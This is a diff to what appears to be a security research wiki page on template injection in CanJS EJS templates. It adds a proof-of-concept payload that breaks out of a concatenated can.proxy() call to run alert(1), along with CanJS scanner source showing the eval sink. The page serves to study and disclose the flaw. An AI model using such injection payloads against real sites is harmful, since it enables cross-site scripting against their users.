@@ -49,6 +49,24 @@ In other words: whenever the user has control over content of the ERB-style temp
 </body>
 }}}
 
+Another injection problem can be abused by using a concatenation feature that will be discussed later on this page. 
+
+{{{
+<script src="http://code.jquery.com/jquery-2.0.3.min.js"></script>
+<script src="http://canjs.us/release/latest/can.jquery.js"></script> 
+
+<body>
+    <script type="text/ejs" id="todoList">
+        <%==($a)->abc})-alert(1)-can.proxy(function(){%>
+    </script>
+    <script>
+    can.view('todoList', {});
+    </script>
+</body>
+}}} 
+
+Now, how do these work internally?
+
 == Eval via myEval ==
 
 CanJS takes it easy and simply throws the extracted template data into a string, wrapped by a bunch of `with()` blocks and afterwards sends it to an `eval`. That's all.
@@ -68,4 +86,23 @@ out = {
 myEval.call(out, 'this.fn = (function(_CONTEXT,_VIEW){' + out.out + '});\r\n//@ sourceURL=' + name + ".js");
                 
 return out;
+}}}
+
+CanJS shows no mercy when coming to quirky injection sinks. Aside from the aforementioned `eval` via `myEval`, CanJS also allows to inject code into a string-concatenated call against `can.proxy() - that is later being evaluated.
+
+{{{
+        Scanner.prototype = {
+
+            helpers: [
+
+                {
+                    name: /\s*\(([\$\w]+)\)\s*->([^\n]*)/,
+                    fn: function(content) {
+                        var quickFunc = /\s*\(([\$\w]+)\)\s*->([^\n]*)/,
+                            parts = content.match(quickFunc);
+
+                        return "can.proxy(function(__){var " + parts[1] + "=can.$(__);" + parts[2] + "}, this);";
+                    }
+                }
+            ],
 }}}
